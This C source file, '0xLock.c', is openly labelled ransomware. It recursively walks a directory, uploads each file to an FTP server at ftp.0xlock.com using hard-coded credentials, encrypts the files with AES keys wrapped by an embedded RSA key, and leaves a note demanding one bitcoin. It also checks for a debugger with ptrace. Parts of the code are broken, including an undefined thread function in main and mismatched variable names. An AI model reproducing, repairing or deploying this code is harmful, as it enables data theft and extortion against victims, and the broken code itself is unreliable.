/**
 * @file 0xLock.c
 * @author Chun Hao (chunhao.lee@u.nus.edu)
 * @brief Ransomware that traverses directories, exfiltrate files to FTP server, and encrypts files
 * @version 0.1
 * @date 2025-03-02
 * @note Compilation: gcc 0xLock.c -o 0xLock -lssl -lcrypto -lpthread -lcurl
 * @note Generate private key pem file: openssl genrsa -out rsa_private_key.pem 4096
 * @note Extract public key from private key: openssl rsa -in rsa_private_key.pem -out public_key.pem -outform PEM -pubout
 * 
 * Dependencies:
 * - OpenSSL (for AES and RSA encryption)
 * - libcurl (for FTP functionality)
 * - pthread (for multi-threading)
 *
 * @param argc Number of command line arguments
 * @param argv Array of command line arguments
 *             argv[1]: Target directory path to encrypt
 *
 * @return 0 on successful execution, 1 if incorrect arguments provided
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <pthread.h>
#include <curl/curl.h>

#define MAX_PATH 1024
#define AES_KEY_SIZE 256
#define RSA_KEY_BITS 2048
#define FTP_SERVER "ftp.0xlock.com"
#define FTP_USERNAME "goodguy"
#define FTP_PASSWORD "goodguyp"
#define FTP_PORT 21

const char *rsa_public_key_pem = "-----BEGIN PUBLIC KEY-----\n"
"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkooy9wcwD+rft8vy8sS+
8BzmTnBS395mrUe6GJjx1ym/NHRmuYdG3RxuU4EbX5ORt5AOPFk0TdiXE6d44rhc
1HfCio8ZmVplaOrTdX9wy35Nfhym6fDP5WBKHzmProGQ5X98fvRxFD+OugLGmKGJ
YaIIiB8SIx/3ZCecpsOMC9dYJpZsIGjF19/cIWb+JRV+Z4jhORuQAV4kYv89k5Wy
JhylAvyfsIcKD6RC1p9U+A+VAxEeydtUmbVJ1ocygu9UCkN9rVdM1+akDgDHQPEb
f0UX3YNc67SOJQrwE6JlleNcIp4os9kv0qFx3wl7A1oNQ+hhiXCOL0tvUS8SEQAJ
zwIDAQAB\n"
"-----END PUBLIC KEY-----\n";

int is_debugger_present() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return 1;
    }

    ptrace(PTRACE_DETACH, 0, 1, 0);
    return 0;
}

void drop_ransom_note(const char *dir_path) {
    char note_path[MAX_PATH];
    snprintf(note_path, sizeof(note_path), "%s/RESTORE_FILES.txt", dir_path);

    FILE *note = fopen(note_path, "w");
    if (!note) return;

    fprintf(note, "Your files have been encrypted!\n");
    fprintf(note, "To restore them, send 1 BTC to this address: 1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\n");
    fprintf(note, "Contact us at: goodguy@0xLock.com\n");

    fclose(note);
}

void generate_aes_key(unsigned char *key) {
    RAND_bytes(key, AES_KEY_SIZE / 8);
}

void encrypt_file_aes(const char *file_path, const unsigned char *key) {
    FILE *input_file = fopen(file_path, "rb");
    if (!input_file) return;

    FILE *output_file = fopen("encrypted.tmp", "wb");
    if (!output_file) {
        fclose(input_file);
        return;
    }

    AES_KEY aes_key;
    AES_set_encrypt_key(key, AES_KEY_SIZE, &aes_key);

    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);
    fwrite(iv, 1, AES_BLOCK_SIZE, output_file);

    unsigned char in_buffer[1024];
    unsigned char out_buffer[1024 + AES_BLOCK_SIZE];
    int bytes_read;

    while ((bytes_read = fread(in_buffer, 1, sizeof(in_buffer), input_file)) > 0) {
        int out_len;
        AES_cbc_encrypt(in_buffer, out_buffer, bytes_read, &aes_key, iv, AES_ENCRYPT);
        fwrite(out_buffer, 1, bytes_read, output_file);
    }

    fclose(input_file);
    fclose(output_file);

    remove(file_path);
    rename("encrypted.tmp", file_path);
    char new_file_name[MAX_PATH];
    snprintf(new_file_name, MAX_PATH, "%s.encrypted", file_path);
    rename(file_path, new_file_name);
}

void encrypt_aes_key_rsa(const unsigned char *aes_key, unsigned char *encrypt_aes_key_rsa, int *encrypted_aes_key_len) {
    BIO *bio = BIO_new_mem_buf((void *)rsa_public_key_pem, -1);
    RSA *rsa_public_key = PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);

    *encrypted_aes_key_len = RSA_public_encrypt(AES_KEY_SIZE / 8, aes_key, encrypted_aes_key, rsa_public_key, RSA_PKCS1_OAEP_PADDING);
    RSA_free(rsa_public_key);
}

/**
 * Send a file to the FTP server before encrypting it
 * 
 * @param file_path The local path of the file to exfiltrate
 * @return 1 on success, 0 on failure
 */
int exfiltrate_file_to_ftp(const char *file_path) {
    CURL *curl;
    CURLcode res;
    FILE *file;
    struct stat file_info;
    
    if (stat(file_path, &file_info) != 0) {
        return 0;
    }
    
    // Skip directories and empty files
    if (S_ISDIR(file_info.st_mode) || file_info.st_size == 0) {
        return 0;
    }
    
    // Skip files larger than 50MB to avoid excessive network traffic
    if (file_info.st_size > 50 * 1024 * 1024) {
        return 0;
    }
    
    file = fopen(file_path, "rb");
    if (!file) {
        return 0;
    }
    
    curl = curl_easy_init();
    if (curl) {
        const char *filename = strrchr(file_path, '/');
        if (filename) {
            filename++; // Skip the '/'
        } else {
            filename = file_path;
        }
        
        char ftp_url[MAX_PATH];
        snprintf(ftp_url, MAX_PATH, "ftp://%s/%s", FTP_SERVER, filename);
        
        curl_easy_setopt(curl, CURLOPT_URL, ftp_url);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_USERNAME, FTP_USERNAME);
        curl_easy_setopt(curl, CURLOPT_PASSWORD, FTP_PASSWORD);
        curl_easy_setopt(curl, CURLOPT_PORT, FTP_PORT);
        curl_easy_setopt(curl, CURLOPT_FTP_CREATE_MISSING_DIRS, 1L);
        
        curl_easy_setopt(curl, CURLOPT_READDATA, file);
        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
        
        res = curl_easy_perform(curl);
        
        curl_easy_cleanup(curl);
        fclose(file);
        
        return (res == CURLE_OK) ? 1 : 0;
    }
    
    fclose(file);
    return 0;
}

void *traverse_and_encrypt(void *arg) {
    char *dir_path = (char *)arg;
    DIR *dir = opendir(dir_path);
    if (!dir) return NULL;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);

        struct stat statbuf;
        if (stat(path, &statbuf) == 0) {
            if (S_ISDIR(statbuf.st_mode)) {
                pthread_t thread;
                char *subdir_path = strdup(path);
                pthread_create(&thread, NULL, traverse_and_encrypt, subdir_path);
                pthread_join(thread, NULL);
                free(subdir_path);
            } else if (S_ISREG(statbuf.st_mode)) {
                exfiltrate_file_to_ftp(path);
                
                unsigned char aes_key[AES_KEY_SIZE / 8];
                generate_aes_key(aes_key);
                encrypt_file_aes(path, aes_key);

                unsigned char encrypted_aes_key[RSA_size(RSA_new())];
                int encrypted_aes_key_len;
                encrypt_aes_key_rsa(aes_key, encrypted_aes_key, &encrypted_aes_key_len);

                FILE *encrypted_key_file = fopen(strcat(path,".key"),"wb");
                fwrite(encrypted_aes_key,1,encrypted_aes_key_len,encrypted_key_file);
                fclose(encrypted_key_file);
            }
        }
    }
    closedir(dir);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <directory_path>\n", argv[0]);
        return 1;
    }

    const char *target_dir = argv[1];

    pthread_t main_thread;
    pthread_create(&main_thread, NULL, threaded_function, (void *)target_dir);
    pthread_join(main_thread, NULL);

    drop_ransom_note(target_dir);

    return 0;
}
